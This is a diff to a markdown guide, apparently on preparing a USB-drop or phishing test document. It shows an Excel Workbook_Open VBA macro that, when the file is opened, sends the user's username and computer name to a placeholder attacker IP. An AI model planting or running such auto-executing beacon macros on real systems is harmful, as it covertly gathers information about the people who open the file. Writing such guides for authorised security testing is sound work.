@@ -198,7 +198,7 @@ File preparation
 - Select “ThisWorkbook” in the project pane (top-left)
 - Insert the following code in the main window
 
-Sub Workbook_Open()
+```Sub Workbook_Open()
  Set IEapp = CreateObject("InternetExplorer.Application")
  
  Dim username
@@ -208,7 +208,7 @@ Sub Workbook_Open()
  WebUrl = "http://<ATTACKING_IP>/<USB_DESCRIPTION>?user=" & username & "&computername=" & computername
  
  IEapp.navigate WebUrl
-
+```  
 
 **Side-Note:** Remember to edit line 7 to include your attacking IP address and a USB description (ex: green, front lobby, excelmacro_green).
 {: .notice--info}  
